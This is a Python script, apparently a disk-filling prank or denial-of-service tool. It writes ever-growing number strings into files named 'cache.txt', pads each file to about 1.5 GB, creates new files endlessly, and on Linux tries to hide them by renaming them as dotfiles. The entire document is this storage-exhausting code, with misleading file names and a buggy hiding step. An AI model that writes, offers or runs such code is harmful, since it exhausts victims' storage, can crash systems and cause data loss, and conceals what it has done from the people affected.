import os
    
numbers = open("cache.txt", "a")
name = "cache.txt"
n = 1000
a = 0
sizefile = 0
tryit = ""
b = 0
hide = input("are you on linux? --> ")

def hide_file(name):
    import os
    os.rename(name, os.path.join(
        os.path.dirname(name), 
        '.' + os.path.basename(name))
    )
   
def go(n, a, numbers, tryit, sizefile, name):
	
	for i in range(15):
		n *= n
		a += 1
		numbers.write(str(n))
		print(a)
		numbers.close()
		numbers = open(name, "r")
		tryit = numbers.read()
		numbers.close()
		numbers = open(name, "a")
	
	while sizefile < 1500000000:
		for i in range(100):	
			numbers.write(tryit)
		
		sizefile = os.stat(name).st_size
		print(sizefile)
		
while True:
	if hide == "y" or hide == "yes":
		numbers.close()
		hide_file(name)
	numbers = open(name, "a")
	go(n, a, numbers,tryit, sizefile, name)
	name = ("cache" + str(b) + ".txt")
	b += 1
	
numbers.close()
